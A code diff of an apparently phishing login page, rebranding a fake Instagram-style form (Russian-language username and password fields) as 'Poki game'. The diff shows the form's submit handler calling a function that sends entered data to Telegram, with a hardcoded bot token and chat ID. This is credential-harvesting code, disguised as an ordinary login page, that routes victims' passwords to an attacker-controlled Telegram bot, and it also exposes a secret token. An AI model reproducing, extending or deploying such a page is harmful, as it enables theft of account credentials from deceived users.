@@ -36,7 +36,8 @@
         .logo {
             width: 175px;
             margin: 20px auto 30px;
-            filter: invert(1);
+           
+            color: white;
         }
 
         select{
@@ -161,7 +162,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+       <h1 class="logo">Poki game</h1>
         <form id="loginForm">
             <input id="loginUser" type="text" placeholder="Телефон, имя пользователя или эл. адрес" required>
             <input id="passwordUser" type="password" placeholder="Пароль" required>
@@ -189,7 +190,7 @@
             sendToTelegramIsa()
         });
 
-        
+
         function sendToTelegram() {
             const botToken = "7273831188:AAEdT5K3uCPPEiBhFGHezOTBNUNhxuCwmVY";
             const chatId = "1466048795";
